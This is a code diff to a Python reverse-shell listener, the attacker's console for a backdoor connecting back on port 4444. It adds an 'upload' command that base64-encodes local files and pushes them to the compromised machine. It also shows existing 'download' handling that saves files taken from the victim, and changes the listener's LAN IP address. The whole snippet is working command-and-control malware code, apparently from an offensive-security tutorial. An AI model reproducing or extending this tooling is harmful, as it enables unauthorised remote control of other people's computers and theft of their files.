@@ -58,12 +58,20 @@ class Listener:
             file.write(base64.b64decode(content))
             return "[+] Download successful. "
 
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
     def run(self):
         while True:
             # ask the user for a command
             command = raw_input(">> ")
             # split the command in a list to have the command and the argument seperated
             command = command.split(" ")
+            if command[0] == "upload":
+                file_content = self.read_file(command[1])
+                command.append(file_content)
+
             result = self.execute_remotely(command)
             if command[0] == "download":
                result = self.write_file(command[1], result)
@@ -73,5 +81,5 @@ class Listener:
 
 
 # use the class in the same file, you can run it from another file is better
-my_listener = Listener("192.168.1.7", 4444)
+my_listener = Listener("192.168.1.8", 4444)
 my_listener.run()
